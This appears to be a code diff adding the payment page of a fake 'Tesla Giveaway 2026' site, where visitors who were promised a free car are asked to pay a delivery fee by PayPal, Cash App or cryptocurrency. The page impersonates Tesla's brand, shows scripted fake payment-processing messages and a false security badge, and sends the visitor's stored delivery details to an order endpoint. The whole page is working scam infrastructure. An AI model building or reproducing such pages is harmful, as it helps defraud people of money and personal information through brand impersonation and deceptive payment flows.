@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Complete Payment | Tesla Giveaway 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  <style>
+    body{background:var(--light);}
+    .page-wrap{max-width:680px;margin:0 auto;padding:88px 24px 64px;}
+    .page-card{background:white;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.09);border:1.5px solid rgba(0,0,0,.05);padding:48px;}
+    @media(max-width:560px){.page-card{padding:28px 20px;border-radius:18px;}}
+    .page-title{font-size:26px;font-weight:800;color:var(--dark);text-align:center;margin-bottom:8px;}
+    .page-sub{font-size:15px;color:var(--gray-2);text-align:center;line-height:1.65;margin-bottom:32px;}
+
+    .crumbs{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--gray-2);margin-bottom:32px;justify-content:center;flex-wrap:wrap;}
+    .crumb-done{color:var(--success);font-weight:600;}
+    .crumb-active{color:var(--red);font-weight:700;}
+    .crumb-sep{color:var(--border);}
+
+    /* Order summary */
+    .order-box{background:var(--light);border-radius:16px;padding:20px 24px;margin-bottom:28px;}
+    .order-box-title{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:12px;}
+    .order-row{display:flex;justify-content:space-between;align-items:center;font-size:14px;padding:6px 0;}
+    .order-row:not(:last-child){border-bottom:1px solid rgba(0,0,0,.06);}
+    .order-label{color:var(--gray-2);}
+    .order-value{color:var(--dark);font-weight:600;}
+    .order-total{font-size:18px;font-weight:800;color:var(--red);}
+    .order-free{font-size:18px;font-weight:800;color:var(--success);}
+
+    /* Payment cards */
+    .pay-card{border-radius:16px;border:2px solid var(--border);padding:22px 24px;cursor:pointer;transition:all var(--transition);margin-bottom:14px;display:flex;align-items:center;gap:18px;position:relative;overflow:hidden;}
+    .pay-card:hover{border-color:rgba(227,25,55,.35);box-shadow:var(--shadow-md);transform:translateY(-2px);}
+    .pay-card.selected{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,25,55,.12);}
+    .pay-card.selected::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--red);}
+    .pay-logo{width:52px;height:52px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0;}
+    .pay-logo-paypal{background:#003087;}
+    .pay-logo-cashapp{background:#00D632;}
+    .pay-logo-crypto{background:linear-gradient(135deg,#F7931A,#FFBA00);}
+    .pay-info{flex:1;}
+    .pay-name{font-size:16px;font-weight:700;color:var(--dark);margin-bottom:2px;}
+    .pay-desc{font-size:13px;color:var(--gray-2);}
+    .pay-check{width:26px;height:26px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;transition:all var(--transition);flex-shrink:0;}
+    .pay-card.selected .pay-check{background:var(--red);border-color:var(--red);color:white;}
+
+    /* Security note */
+    .security-row{display:flex;align-items:center;gap:8px;justify-content:center;margin:20px 0 0;font-size:12px;color:var(--gray-2);}
+
+    /* Processing overlay */
+    #payLoader{position:fixed;inset:0;background:rgba(23,26,32,.97);z-index:9999;display:none;flex-direction:column;align-items:center;justify-content:center;gap:0;backdrop-filter:blur(10px);}
+    #payLoader.show{display:flex;}
+    .pay-loader-step{color:white;font-size:18px;font-weight:600;margin-bottom:8px;text-align:center;}
+    .pay-loader-sub{color:rgba(255,255,255,.5);font-size:14px;margin-bottom:32px;text-align:center;}
+    .pay-bar-wrap{width:260px;height:4px;background:rgba(255,255,255,.1);border-radius:999px;overflow:hidden;margin:0 auto 28px;}
+    .pay-bar{height:100%;background:var(--red);border-radius:999px;width:0;transition:width .7s ease;}
+    .pay-icon{font-size:64px;display:none;text-align:center;}
+    .pay-icon.show{display:block;animation:scaleIn .5s cubic-bezier(.34,1.56,.64,1);}
+  </style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      TESLA
+    </a>
+    <a href="/delivery-method.html" class="btn btn-ghost" style="font-size:14px;">← Back</a>
+  </div>
+</nav>
+
+<div class="page-wrap">
+  <div class="crumbs">
+    <span class="crumb-done">✓ Verified</span><span class="crumb-sep">›</span>
+    <span class="crumb-done">✓ Vehicle</span><span class="crumb-sep">›</span>
+    <span class="crumb-done">✓ Delivery Details</span><span class="crumb-sep">›</span>
+    <span class="crumb-done">✓ Delivery Method</span><span class="crumb-sep">›</span>
+    <span class="crumb-active">Payment</span>
+  </div>
+
+  <div class="page-card anim-fade-up">
+    <h1 class="page-title">💳 Complete Your Order</h1>
+    <p class="page-sub">Pay the delivery fee to finalise your Tesla order. Select your preferred payment method below.</p>
+
+    <!-- Order summary -->
+    <div class="order-box">
+      <div class="order-box-title">Order Summary</div>
+      <div class="order-row">
+        <span class="order-label">Tesla Vehicle</span>
+        <span class="order-free">FREE 🎉</span>
+      </div>
+      <div class="order-row">
+        <span class="order-label">Vehicle Value</span>
+        <span class="order-value" id="vehicleValue">—</span>
+      </div>
+      <div class="order-row">
+        <span class="order-label">Delivery Method</span>
+        <span class="order-value" id="deliveryMethodName">—</span>
+      </div>
+      <div class="order-row">
+        <span class="order-label">Delivery Timeframe</span>
+        <span class="order-value" id="deliveryDays">—</span>
+      </div>
+      <div class="order-row" style="border-top:2px solid var(--border);margin-top:4px;padding-top:12px;">
+        <span class="order-label" style="font-weight:700;color:var(--dark);">Total Due Today</span>
+        <span class="order-total" id="totalDue">—</span>
+      </div>
+    </div>
+
+    <!-- Payment methods -->
+    <div style="margin-bottom:8px;font-size:13px;font-weight:700;color:var(--dark);text-transform:uppercase;letter-spacing:.05em;">Select Payment Method</div>
+
+    <div class="pay-card" id="pay-paypal" onclick="selectPayment('paypal')">
+      <div class="pay-logo pay-logo-paypal">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M7.144 19.532l1.049-5.751c.11-.606.67-1.031 1.284-.999 2.818.143 5.296-.236 6.785-2.018 1.053-1.263 1.35-3.078.9-5.31C16.613 3.507 14.413 3 12.294 3H5.573c-.623 0-1.148.452-1.257 1.067L2.07 17.536c-.072.4.237.771.644.771h3.27l1.16-6.373v7.598z"/><path d="M19.428 8.454c-.048 3.266-1.967 5.474-5.52 6.054-.398.065-.801.097-1.207.097h-2.12l-1.16 6.373H6.17l-.666 3.651c-.068.374.222.721.603.721h3.29l1.075-5.922h2.127c4.386 0 7.127-2.268 7.67-6.43a5.29 5.29 0 00-.841-4.544z" opacity=".6"/></svg>
+      </div>
+      <div class="pay-info">
+        <div class="pay-name">PayPal</div>
+        <div class="pay-desc">Pay securely using your PayPal account or linked card</div>
+      </div>
+      <div class="pay-check" id="pcheck-paypal">✓</div>
+    </div>
+
+    <div class="pay-card" id="pay-cashapp" onclick="selectPayment('cashapp')">
+      <div class="pay-logo pay-logo-cashapp">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm.5 14.5v1h-1v-1.03C9.92 16.24 9 15.18 9 14h1.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5c0-.74-.51-1.3-1.25-1.47l-1.25-.3C9.86 11.93 9 11.03 9 10c0-1.3.96-2.34 2.5-2.47V6.5h1v1.03c1.58.24 2.5 1.3 2.5 2.47H13.5c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5c0 .74.51 1.3 1.25 1.47l1.25.3C14.14 12.07 15 12.97 15 14c0 1.3-.96 2.34-2.5 2.5z"/></svg>
+      </div>
+      <div class="pay-info">
+        <div class="pay-name">Cash App</div>
+        <div class="pay-desc">Pay instantly using your Cash App balance or linked debit card</div>
+      </div>
+      <div class="pay-check" id="pcheck-cashapp">✓</div>
+    </div>
+
+    <div class="pay-card" id="pay-crypto" onclick="selectPayment('crypto')">
+      <div class="pay-logo pay-logo-crypto">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M11.5 2a9.5 9.5 0 100 19A9.5 9.5 0 0011.5 2zm1.13 13.38c-.12.53-.47.88-1 1.02V17.5h-1v-1.06c-.75-.13-1.4-.57-1.63-1.25l1.15-.46c.12.37.5.68.96.68.57 0 1-.43 1-1 0-.5-.37-.84-.91-.97l-.69-.16c-.88-.21-1.47-.88-1.47-1.78 0-.9.57-1.56 1.59-1.75V9.5h1v1.06c.71.14 1.22.55 1.43 1.13l-1.1.44c-.1-.3-.36-.53-.72-.53-.5 0-.87.37-.87.87 0 .46.31.75.82.88l.72.17c.95.22 1.56.9 1.56 1.85 0 .32-.06.63-.17.91z"/></svg>
+      </div>
+      <div class="pay-info">
+        <div class="pay-name">Cryptocurrency</div>
+        <div class="pay-desc">Pay with Bitcoin, Ethereum, USDT, or other major crypto assets</div>
+      </div>
+      <div class="pay-check" id="pcheck-crypto">✓</div>
+    </div>
+
+    <button class="btn btn-primary btn-full btn-lg" id="payBtn" onclick="placeOrder()" disabled style="opacity:.45;cursor:not-allowed;margin-top:8px;">
+      🔒 Pay & Place Order
+    </button>
+
+    <div class="security-row">
+      <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+      256-bit SSL Encryption · Secure & Verified Payment
+    </div>
+  </div>
+</div>
+
+<!-- Processing overlay -->
+<div id="payLoader">
+  <div style="text-align:center;">
+    <div class="pay-icon" id="payIcon">🎉</div>
+    <div class="pay-loader-step" id="payStep">Processing payment...</div>
+    <div class="pay-loader-sub" id="paySub">Please do not close this page</div>
+    <div class="pay-bar-wrap"><div class="pay-bar" id="payBar"></div></div>
+    <div id="paySpinner" style="display:flex;justify-content:center;"><div class="spinner"></div></div>
+  </div>
+</div>
+
+<script src="/js/app.js"></script>
+<script>
+// Load stored data
+const savedCar      = JSON.parse(localStorage.getItem('tesla_selected_car')    || 'null');
+const savedDelivery = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
+const savedMethod   = JSON.parse(localStorage.getItem('tesla_delivery_method')  || 'null');
+const sessionToken  = localStorage.getItem('tesla_session_token') || getSession();
+
+if (!savedCar || !savedDelivery || !savedMethod) { window.location.href = '/dashboard.html'; }
+
+const carValues = { model3:'$38,990', modely:'$44,990', models:'$74,990', modelx:'$79,990', cybertruck:'$60,990', roadster:'$200,000' };
+
+// Populate summary
+document.getElementById('vehicleValue').textContent = savedCar ? (carValues[savedCar.id] || '—') : '—';
+document.getElementById('deliveryMethodName').textContent = savedMethod ? savedMethod.name : '—';
+document.getElementById('deliveryDays').textContent = savedMethod ? savedMethod.days : '—';
+document.getElementById('totalDue').textContent = savedMethod ? savedMethod.priceDisplay : '—';
+
+// Payment selection
+let selectedPayment = null;
+
+function selectPayment(method) {
+  selectedPayment = method;
+  document.querySelectorAll('.pay-card').forEach(el => el.classList.remove('selected'));
+  document.getElementById(`pay-${method}`).classList.add('selected');
+  const btn = document.getElementById('payBtn');
+  btn.disabled = false; btn.style.opacity = '1'; btn.style.cursor = 'pointer';
+  btn.textContent = `🔒 Pay ${savedMethod?.priceDisplay || ''} & Place Order`;
+}
+
+// Place order
+async function placeOrder() {
+  if (!selectedPayment || !sessionToken) return;
+
+  const loader = document.getElementById('payLoader');
+  const bar = document.getElementById('payBar');
+  const step = document.getElementById('payStep');
+  const sub  = document.getElementById('paySub');
+
+  loader.style.display = 'flex';
+
+  const paymentNames = { paypal: 'PayPal', cashapp: 'Cash App', crypto: 'Cryptocurrency' };
+  const paymentName = paymentNames[selectedPayment];
+
+  setTimeout(() => { bar.style.width='30%'; step.textContent=`Connecting to ${paymentName}...`; sub.textContent='Verifying your payment'; }, 300);
+  setTimeout(() => { bar.style.width='60%'; step.textContent='Authorising payment...'; sub.textContent='Encrypting your transaction'; }, 1400);
+  setTimeout(() => { bar.style.width='85%'; step.textContent='Confirming your order...'; sub.textContent='Almost done!'; }, 2700);
+
+  try {
+    const result = await apiCall('/order', 'POST', {
+      sessionToken,
+      selectedCar: savedCar,
+      deliveryDetails: savedDelivery,
+      deliveryMethod: savedMethod,
+      paymentMethod: { id: selectedPayment, name: paymentName },
+    });
+
+    setTimeout(() => {
+      bar.style.width = '100%';
+      document.getElementById('paySpinner').style.display = 'none';
+      document.getElementById('payIcon').classList.add('show');
+      step.textContent = 'Order Placed Successfully!';
+      sub.textContent  = 'Taking you to your order confirmation...';
+    }, 3800);
+
+    localStorage.setItem('tesla_last_order', JSON.stringify(result.order));
+
+    setTimeout(() => { window.location.href = '/order-success.html'; }, 5000);
+
+  } catch (err) {
+    loader.style.display = 'none';
+    showToast(err.message || 'Payment failed. Please try again.', 'error');
+  }
+}
+</script>
+</body>
+</html>
